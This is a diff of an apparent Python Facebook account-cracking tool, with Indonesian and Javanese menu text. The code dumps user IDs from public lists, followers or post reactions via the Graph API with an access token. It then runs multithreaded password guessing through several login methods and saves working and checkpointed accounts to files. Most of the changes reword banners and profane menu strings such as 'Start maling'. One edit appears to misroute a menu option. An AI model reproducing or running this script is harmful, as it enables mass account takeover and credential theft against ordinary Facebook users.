@@ -73,15 +73,15 @@ def folder():
 IP = requests.get('https://api.ipify.org').text
 def banner():
 	print (''' %s 
- © MAS FAJAR-AL%s
-                                          
+ © Riyandika fajar s%s
+ 
 ███████████████████████████████████████████
 █▄─▄▄─██▀▄─████▄─▄██▀▄─██▄─▄▄▀█▄─▀─▄█▄─▄▄▀█
 ██─▄████─▀─██─▄█─███─▀─███─▄─▄██▀─▀███─██─█
 ▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄█▄▄▀▄▄▄▄▀▀
          \/    \/ 
- %s[%s*%s] By : %sRomi Afrizal
- %s[%s*%s] Recode by :Fajar-Al
+ %s[%s*%s] By : %sMAS FAJAR
+ %s[%s*%s] --------------------------------------
  [%s*%s] IP : %s%s
 '''%(H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
 
@@ -128,7 +128,7 @@ def masuk():
     else:
     	print("%s [!] Isi yang benar kentod "%(M));exit()
 
-# MENU MAS
+# MENU INI AJG
 def menu():
     os.system('clear')
     try:
@@ -144,19 +144,19 @@ def menu():
     except requests.exceptions.ConnectionError:
         exit("%s [!] Kesalahan koneksi "%(M))
     banner()
-    print (' %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
-    print (' [%s01%s] Dump id ngawor'%(K,P)) 
+    print (' %s[ selamat maling %s%s%s ] \n'%(P,K,nama,P))
+    print (' [%s01%s] Dump id public'%(K,P)) 
     print (' [%s02%s] Dump id followers'%(K,P)) 
     print (' [%s03%s] Dump id reaction post'%(K,P)) 
-    print (' [%s04%s] %sGas crack%s'%(K,P,H,P)) 
+    print (' [%s04%s] %sStart maling %s'%(K,P,H,P)) 
     print (' [%s05%s] Ganti user agent'%(K,P)) 
-    print (' [%s06%s] Cek hasil crack'%(K,P)) 
+    print (' [%s06%s] Cek hasil maling'%(K,P)) 
     #print (' [%s07%s] Gabung group'%(K,P))
     #print (' [%s08%s] Info script'%(K,P))
     print (' [%s00%s] Metu (hapus token)'%(M,P))
     unik = raw_input('\n%s [?] Menu : %s'%(P,K))
     if unik == '':
-        print("%s [!] Isi seng bener mass "%(M));jeda(2);menu()
+        print("%s [!] Isi seng genah cok "%(M));jeda(2);menu()
     elif unik in['1','01']:
         publik(romz)
     elif unik in['2','02']:
@@ -180,7 +180,7 @@ def menu():
             total = open("hasil/%s"%(file)).read().splitlines()
             print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
             nm_file = ("%s"%(file)).replace("-", " ")
-            jalan(" [%s*%s] total e kabeh : %s"%(K,P,len(total)))
+            jalan(" [%s*%s] totale akun : %s"%(K,P,len(total)))
             print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
             for akun in total:
             	fb = akun.replace("\n","")
@@ -229,7 +229,7 @@ def publik(romz,headers=header):
         raw_input('\n%s [ %senter %s] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('\n %s[!] gagal dump id'%(P))
+        exit('\n %s[!] gagal ngedump '%(P))
 
 # DUMP FOLLOWERS
 def followers(romz,headers=header):
@@ -237,7 +237,7 @@ def followers(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] Ketik '%sme%s' pencet s nek pengen dump fl dewe "%(P,M,P,H,P))
+    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
         idt = raw_input(' [*] Target id : %s'%(K))
         batas = raw_input(' %s[*] Maximal id : %s'%(P,K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
@@ -266,7 +266,7 @@ def postingan(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] He cok postingan e kudu publik "%(P,M,P))
+    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
         idt = raw_input(' [*] Id post   : %s'%(K))
         simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
         r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
@@ -297,17 +297,17 @@ class ngentod:
 
     def romiy(self):
         try:
-            self.apk = raw_input('\n %s[?] file seng mbok dump mau :%s '%(P,K))
+            self.apk = raw_input('\n %s[?] file dump mau :%s '%(P,K))
             self.id = open(self.apk).read().splitlines()
             print '%s [%s*%s] jumlah id : %s%s' %(P,K,P,H,len(self.id))
         except:
-            print '\n%s [!] File dump renek,dump dulu bangsul'%(M)
+            print '\n%s [!] File dump renek, dump id disek baru dilebokne'%(M)
             raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-        unikers = raw_input('%s [?] pengen nanggo pasword manual ? [y/t] :%s '%(P,K))
+        unikers = raw_input('%s [?] pengen nanggo pasword manual? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
             print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
             while True:
-                pwx = raw_input(' %s[?] isi pasword sak pengenmu :%s '%(P,K))
+                pwx = raw_input(' %s[?] set password :%s '%(P,K))
                 if pwx == '':
                     print '\n %s[!] jangan kosong '%(M)
                 elif len(pwx)<=5:
@@ -318,8 +318,8 @@ class ngentod:
                         if ind == '':
                             print("%s [!] Isi yang benar kentod "%(M));self.zona()
                         elif ind in ('1', '01'):
-                            print '\n %s[%s*%s] akun %sOK%s kesimpen neng >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s*%s] akun %sCP %skesimpen neng > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
+                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -337,7 +337,7 @@ class ngentod:
                                         log.submit(self.basic, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
-                        elif ind in ('3', '03'):
+                        elif ind in ('2', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
@@ -348,18 +348,18 @@ class ngentod:
                                     except: pass
                             os.remove(self.apk);exit()
                         else:
-                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
-                    print '\n%s [ pilih methode crack - monggo dicoba siji² ]\n'%(P)
-                    print ' [%s01%s] methode b-api (crack ngacir)'%(K,P)
-                    print ' [%s02%s] methode mbasic (crack santai)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack lemot) walapun lemot tapi hasilnya banyak lan tap yes'%(K,P)
+                            print '\n %s[!] isi yang benar kentod'%(M);self.zona()
+                    print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
+                    print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
+                    print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
+                    print ' [%s03%s] methode mobile (crack sangat lambat) hasil banyak kemungkinan besar akun terkena checkpoint berkurang / one tab yes'%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
             print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
             print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
             print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) hasil banyak kemungkinan besar akun terkena checkpoint berkurang / one tab yes'%(K,P)
+            print ' [%s03%s] methode mobile (crack sangat lambat) hasile okeh seng cp berkurang lan langsung tap yes'%(K,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -417,7 +417,7 @@ class ngentod:
                         pass
             os.remove(self.apk);exit()
         else:
-            print("\n%s [!] Isi yang benar kentod "%(M));self.langsung()
+            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
 
     def b_api(self, user, zona):
     	try:
@@ -586,8 +586,8 @@ class ngentod:
 # GANTI USER AGENT
 def useragent():
 	print ("\n%s [%s01%s] Ganti bojo "%(P,K,P))
-	print (" [%s02%s] Cek bojomu "%(K,P))
-	print (" [%s00%s] Bali "%(M,P))
+	print (" [%s02%s] Cek bojo "%(K,P))
+	print (" [%s00%s] metu "%(M,P))
 	uas()
 	
 def uas():
@@ -609,7 +609,7 @@ def uas():
                 open("data/ua.txt","w").write(ua_)
                 print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
             open("data/ua.txt","w").write(ua);jeda(2)
-            print ("\n%s [√] kapok bojomu wes diganti"%(H));jeda(2);menu()
+            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
         except KeyboardInterrupt:
 			exit ("\x1b[1;91m [!] Error ") 
     elif u in("2","02"):
